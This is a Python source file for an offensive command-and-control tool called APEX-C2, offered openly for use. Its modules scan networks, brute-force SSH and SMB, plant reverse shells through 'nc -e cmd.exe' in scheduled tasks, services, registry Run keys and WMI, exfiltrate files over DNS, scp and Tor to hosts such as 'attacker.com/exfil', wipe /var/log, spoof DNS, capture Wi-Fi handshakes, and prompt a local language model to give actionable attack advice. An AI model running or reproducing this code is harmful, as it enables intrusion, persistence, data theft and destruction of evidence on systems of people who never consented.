#!/usr/bin/env python3
# APEX-C2 – Ultimate Command & Control Suite

import os
import sys
import json
import subprocess
import time
import threading
import socket
import random
import signal
from pathlib import Path
from datetime import datetime

# ============================================================
# CONFIGURATION
# ============================================================

CONFIG = {
    "apex_home": "/home/mancier/.apex",
    "model": "qwen2.5-coder:7b",
    "gpu": "rtx_5080",
    "vram_gb": 16,
    "zram_gb": 16,
    "auto_approve": True,
    "stealth_mode": False,
    "log_level": "INFO"
}

# ============================================================
# MAIN CONTROL CLASS
# ============================================================

class ApexControl:
    def __init__(self):
        self.config = CONFIG
        self.running = True
        self.modules = {}
        signal.signal(signal.SIGINT, self._shutdown)
        signal.signal(signal.SIGTERM, self._shutdown)
        self._create_dirs()
        self._load_modules()

    def _shutdown(self, sig, frame):
        print("\n🛑 Shutting down APEX-C2...")
        self.running = False
        sys.exit(0)

    def _create_dirs(self):
        for d in ["logs", "results", "payloads", "modules"]:
            Path(f"{self.config['apex_home']}/{d}").mkdir(parents=True, exist_ok=True)

    def _load_modules(self):
        self.modules = {
            "recon": self.recon_network,
            "exploit": self.exploit_target,
            "persist": self.establish_persistence,
            "exfil": self.exfiltrate_data,
            "evade": self.enable_evasion,
            "ai": self.ai_assist,
            "network": self.network_control,
            "crypto": self.crypto_ops
        }
        print("✅ All modules loaded")

    # ============================================================
    # MODULE 1: RECONNAISSANCE
    # ============================================================
    def recon_network(self, target=None):
        print("\n🔍 RECONNAISSANCE MODE")
        if not target:
            target = input("🎯 Target IP/range (or 'auto'): ")
        if target == "auto":
            target = self._get_local_subnet()
        results = {}
        print(f"📡 Scanning {target}...")
        results['ports'] = self._run_command(f"nmap -sS -sV -p- --min-rate 1000 -T4 {target}")
        results['os'] = self._run_command(f"nmap -O --osscan-guess {target}")
        results['vulns'] = self._run_command(f"nmap --script vuln {target}")
        self._save_results("recon", results)
        print(f"✅ Recon complete!")
        return results

    def _get_local_subnet(self):
        import netifaces
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    if addr['addr'] != '127.0.0.1':
                        ip = addr['addr']
                        parts = ip.split('.')
                        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        return "192.168.1.0/24"

    # ============================================================
    # MODULE 2: EXPLOITATION
    # ============================================================
    def exploit_target(self, target=None, service=None):
        print("\n⚡ EXPLOITATION MODE")
        if not target:
            target = input("🎯 Target IP: ")
        if not service:
            service = input("🎯 Service (smb/ssh/http/rdp): ")
        exploits = {
            "smb": [f"crackmapexec smb {target} -u guest -p '' --shares"],
            "ssh": [f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}"],
            "http": [f"sqlmap -u http://{target}/ --batch --risk=3 --level=5"],
            "rdp": [f"crackmapexec rdp {target} -u '' -p '' --users"]
        }
        results = {}
        if service in exploits:
            for cmd in exploits[service]:
                results[cmd] = self._run_command(cmd)
        self._save_results("exploit", results)
        return results

    # ============================================================
    # MODULE 3: PERSISTENCE
    # ============================================================
    def establish_persistence(self, target=None, method=None):
        print("\n🔒 PERSISTENCE MODE")
        methods = {
            "scheduled_task": self._persist_scheduled_task,
            "service": self._persist_service,
            "registry": self._persist_registry,
            "wmi": self._persist_wmi,
            "ssh": self._persist_ssh
        }
        if not target:
            target = input("🎯 Target IP: ")
        if not method or method not in methods:
            print("Available: scheduled_task, service, registry, wmi, ssh")
            method = input("🎯 Select method: ")
        if method in methods:
            result = methods[method](target)
            self._save_results("persist", {method: result})
            print(f"✅ Persistence via {method}!")
            return result
        return {"error": "Unknown method"}

    def _persist_scheduled_task(self, target):
        cmd = f"schtasks /create /tn 'ApexUpdate' /tr 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444' /sc ONLOGON /ru SYSTEM"
        return self._run_command(cmd, target)

    def _persist_service(self, target):
        cmd = f"sc create 'ApexService' binPath= 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444' start= auto"
        return self._run_command(cmd, target)

    def _persist_registry(self, target):
        cmd = f"reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'ApexUpdate' /t REG_SZ /d 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444'"
        return self._run_command(cmd, target)

    def _persist_wmi(self, target):
        cmd = f"wmic /node:{target} process call create 'cmd.exe /c nc -e cmd.exe {self._get_local_ip()} 4444'"
        return self._run_command(cmd, target)

    def _persist_ssh(self, target):
        cmd = f"ssh-keygen -t rsa -f /tmp/apex_key -N '' && ssh-copy-id -i /tmp/apex_key.pub root@{target}"
        return self._run_command(cmd, target)

    def _get_local_ip(self):
        try:
            return subprocess.check_output(['hostname', '-I']).decode().split()[0]
        except:
            return "127.0.0.1"

    # ============================================================
    # MODULE 4: EXFILTRATION
    # ============================================================
    def exfiltrate_data(self, source=None, destination=None):
        print("\n📤 EXFILTRATION MODE")
        if not source:
            source = input("📁 Source file: ")
        if not destination:
            destination = input("📁 Destination: ")
        methods = {"encrypted": self._exfil_encrypted, "stealth": self._exfil_stealth, "tor": self._exfil_tor}
        print("Available: encrypted, stealth, tor")
        method = input("🎯 Select method: ")
        if method in methods:
            result = methods[method](source, destination)
            self._save_results("exfil", {method: result})
            return result
        return {"error": "Unknown method"}

    def _exfil_encrypted(self, source, destination):
        try:
            from cryptography.fernet import Fernet
            import gzip
            key = Fernet.generate_key()
            cipher = Fernet(key)
            with open(source, 'rb') as f:
                data = gzip.compress(f.read())
            encrypted = cipher.encrypt(data)
            output = f"{destination}.encrypted"
            with open(output, 'wb') as f:
                f.write(encrypted)
            with open(f"{output}.key", 'w') as f:
                f.write(key.decode())
            self._run_command(f"scp {output} {destination}")
            return {"status": "success", "file": output, "key": key.decode()}
        except Exception as e:
            return {"error": str(e)}

    def _exfil_stealth(self, source, destination):
        return self._run_command(f"tar -czf - {source} | base64 | nslookup {destination}")

    def _exfil_tor(self, source, destination):
        return self._run_command(f"torsocks curl -X POST --data-binary @{source} {destination}")

    # ============================================================
    # MODULE 5: EVASION
    # ============================================================
    def enable_evasion(self):
        print("\n🕵️ EVASION MODE")
        results = {}
        results['obfuscation'] = self._run_command("echo 'Obfuscating payloads...'")
        results['log_clean'] = self._run_command("find /var/log -type f -exec truncate -s 0 {} \\; 2>/dev/null")
        results['timing'] = self._run_command(f"sleep {random.uniform(1, 10)}")
        self._save_results("evasion", results)
        print("✅ Evasion enabled!")
        return results

    # ============================================================
    # MODULE 6: AI ASSIST (FIXED)
    # ============================================================
    def ai_assist(self, query=None):
        print("\n🧠 AI ASSIST")
        if not query:
            query = input("💭 What do you need? ")
        try:
            import requests
            self._ensure_model()
            
            system_context = """
You are an expert offensive security assistant with deep knowledge of:
- Network penetration testing (Wi-Fi, TCP/IP, routing)
- Exploit development and reverse engineering
- Active Directory attacks (Kerberos, LDAP, SMB)
- Post-exploitation and persistence
- Cryptography and secure communications
- Linux and Windows internals

When the user asks about "handshake", assume they mean:
- TCP 3-way handshake (SYN, SYN-ACK, ACK)
- WPA/WPA2 4-way handshake (for cracking Wi-Fi)
- Kerberos AS-REQ/AS-REP handshake
- SMB/NTLM handshake

Provide detailed, actionable security-focused answers.
"""
            
            response = requests.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": self.config["model"],
                    "prompt": f"{system_context}\n\nUser: {query}\n\nAssistant: ",
                    "stream": False
                },
                timeout=30
            )
            result = response.json().get('response', 'Model not responding')
            print(f"\n🤖 {result}")
            self._save_results("ai_assist", {"query": query, "response": result})
            return result
        except Exception as e:
            print(f"\n⚠️ Ollama error: {e}")
            print("Make sure Ollama is running: ollama serve")
            return None

    def _ensure_model(self):
        import requests
        try:
            subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            subprocess.run(["ollama", "pull", self.config["model"]], check=False)
        except:
            pass

    # ============================================================
    # MODULE 7: NETWORK CONTROL
    # ============================================================
    def network_control(self):
        print("\n🌐 NETWORK CONTROL")
        options = {
            "1": ("Stealth mode", lambda: self._run_command("sudo iptables -I INPUT 1 -j DROP")),
            "2": ("Proxy setup", lambda: self._run_command(f"export http_proxy=http://{input('Proxy: ')}")),
            "3": ("DNS spoof", lambda: self._run_command(f"echo '{input('IP: ')} {input('Domain: ')}' >> /etc/hosts"))
        }
        print("1. Stealth mode\n2. Proxy setup\n3. DNS spoof")
        choice = input("🎯 Select: ")
        if choice in options:
            return options[choice][1]()
        return {"error": "Invalid"}

    # ============================================================
    # MODULE 8: CRYPTO
    # ============================================================
    def crypto_ops(self):
        print("\n🔐 CRYPTO")
        options = {
            "1": self._crypto_rsa,
            "2": self._crypto_aes,
            "3": self._crypto_hash,
            "4": self._crypto_encrypt,
            "5": self._crypto_decrypt
        }
        print("1. RSA key\n2. AES key\n3. Hash file\n4. Encrypt\n5. Decrypt")
        choice = input("🎯 Select: ")
        if choice in options:
            return options[choice]()
        return {"error": "Invalid"}

    def _crypto_rsa(self):
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        pub = key.public_key()
        with open("private.pem", "wb") as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
        with open("public.pem", "wb") as f:
            f.write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
        return {"status": "generated", "private": "private.pem", "public": "public.pem"}

    def _crypto_aes(self):
        from cryptography.fernet import Fernet
        key = Fernet.generate_key()
        with open("aes.key", "wb") as f:
            f.write(key)
        return {"key": key.decode(), "file": "aes.key"}

    def _crypto_hash(self):
        import hashlib
        f = input("📁 File: ")
        with open(f, 'rb') as x:
            data = x.read()
        return {"md5": hashlib.md5(data).hexdigest(), "sha256": hashlib.sha256(data).hexdigest()}

    def _crypto_encrypt(self):
        from cryptography.fernet import Fernet
        f = input("📁 File: ")
        with open(f, 'rb') as x:
            data = x.read()
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(data)
        with open(f + ".enc", 'wb') as x:
            x.write(encrypted)
        with open(f + ".key", 'w') as x:
            x.write(key.decode())
        return {"status": "encrypted", "file": f + ".enc", "key": f + ".key"}

    def _crypto_decrypt(self):
        from cryptography.fernet import Fernet
        f = input("📁 File: ")
        k = input("🔑 Key file: ")
        with open(k, 'r') as x:
            key = x.read().encode()
        with open(f, 'rb') as x:
            data = x.read()
        decrypted = Fernet(key).decrypt(data)
        out = f.replace(".enc", "")
        with open(out, 'wb') as x:
            x.write(decrypted)
        return {"status": "decrypted", "file": out}

    # ============================================================
    # MODULE 9: FULL AUTO ATTACK
    # ============================================================
    def full_auto_attack(self):
        print("\n🎯 FULL AUTO ATTACK")
        confirm = input("⚠️ Run all modules? (yes/no): ")
        if confirm.lower() != "yes":
            return
        target = input("🎯 Target: ")
        results = {}
        results['recon'] = self.recon_network(target)
        results['exploit'] = self.exploit_target(target)
        results['persist'] = self.establish_persistence(target)
        results['exfil'] = self.exfiltrate_data("/tmp/data", "attacker.com/exfil")
        results['evade'] = self.enable_evasion()
        self._save_results("full_attack", results)
        print("✅ FULL ATTACK COMPLETE!")
        return results

    # ============================================================
    # MODULE 10: HANDSHAKE CAPTURE
    # ============================================================
    def capture_handshake(self):
        """Capture WPA/WPA2 handshake for offline cracking"""
        print("\n📡 HANDSHAKE CAPTURE")
        print("This captures a WPA handshake for offline cracking.")
        
        # Check for aircrack-ng
        if not self._check_tool("airodump-ng"):
            print("❌ aircrack-ng not installed. Install: sudo apt install aircrack-ng")
            return None
        
        # Get interface
        interface = input("🎯 Wireless interface (e.g., wlan0mon): ").strip()
        if not interface:
            print("❌ No interface specified.")
            return None
        
        # Put interface in monitor mode
        print(f"🔧 Setting {interface} to monitor mode...")
        self._run_command(f"sudo airmon-ng start {interface}")
        
        # Scan for networks
        print("🔍 Scanning for networks... (Ctrl+C to stop)")
        self._run_command(f"sudo airodump-ng {interface}")
        
        # Target BSSID and channel
        bssid = input("🎯 Target BSSID (MAC): ").strip()
        channel = input("🎯 Target channel: ").strip()
        
        # Start capture
        output_file = f"/tmp/handshake_{bssid.replace(':', '')}"
        print(f"📡 Capturing handshake on channel {channel}...")
        print("Press Ctrl+C when handshake is captured.")
        
        cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"
        self._run_command(cmd)
        
        # Check if handshake was captured
        cap_file = f"{output_file}-01.cap"
        if Path(cap_file).exists():
            result = self._run_command(f"aircrack-ng {cap_file} | grep '1 handshake'")
            if "handshake" in result.get('stdout', ''):
                print(f"✅ Handshake captured! File: {cap_file}")
                import shutil
                shutil.copy(cap_file, f"{self.config['apex_home']}/results/")
                print(f"📁 Saved to {self.config['apex_home']}/results/")
                return {"status": "success", "file": cap_file}
            else:
                print("⚠️ No handshake detected in the capture.")
                return {"status": "no_handshake", "file": cap_file}
        else:
            print("❌ Capture file not found.")
            return {"status": "failed"}

    def _check_tool(self, tool):
        """Check if a tool is installed"""
        return subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode == 0

    # ============================================================
    # CORE UTILITIES
    # ============================================================
    def _run_command(self, cmd, target=None):
        if target:
            if "windows" in target.lower():
                cmd = f"winrm -host {target} -user administrator -pass '' 'cmd.exe /c {cmd}'"
            else:
                cmd = f"ssh -o ConnectTimeout=5 root@{target} '{cmd}'"
        try:
            print(f"🔧 {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return {"stdout": result.stdout[:500], "stderr": result.stderr[:500], "code": result.returncode}
        except Exception as e:
            return {"error": str(e)}

    def _save_results(self, category, data):
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        path = f"{self.config['apex_home']}/results/{category}_{ts}.json"
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        return path

    # ============================================================
    # MAIN MENU
    # ============================================================
    def main_menu(self):
        while self.running:
            print("\n" + "="*60)
            print("⚡ APEX-C2 – POWER CONTROL SUITE")
            print("="*60)
            print("  1. 🔍 Reconnaissance")
            print("  2. ⚡ Exploitation")
            print("  3. 🔒 Persistence")
            print("  4. 📤 Exfiltration")
            print("  5. 🕵️ Evasion")
            print("  6. 🧠 AI Assist")
            print("  7. 🌐 Network Control")
            print("  8. 🔐 Crypto")
            print("  9. 🎯 Full Auto Attack")
            print("  10. 📡 Handshake Capture")
            print("  0. 🚪 Exit")
            choice = input("🎯 Select: ").strip()
            
            if choice == "0":
                break
            elif choice == "1":
                self.recon_network()
            elif choice == "2":
                self.exploit_target()
            elif choice == "3":
                self.establish_persistence()
            elif choice == "4":
                self.exfiltrate_data()
            elif choice == "5":
                self.enable_evasion()
            elif choice == "6":
                self.ai_assist()
            elif choice == "7":
                self.network_control()
            elif choice == "8":
                self.crypto_ops()
            elif choice == "9":
                self.full_auto_attack()
            elif choice == "10":
                self.capture_handshake()
            else:
                print("❌ Invalid option.")

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    print("⚡ APEX-C2 – ULTIMATE COMMAND & CONTROL")
    control = ApexControl()
    control.main_menu()
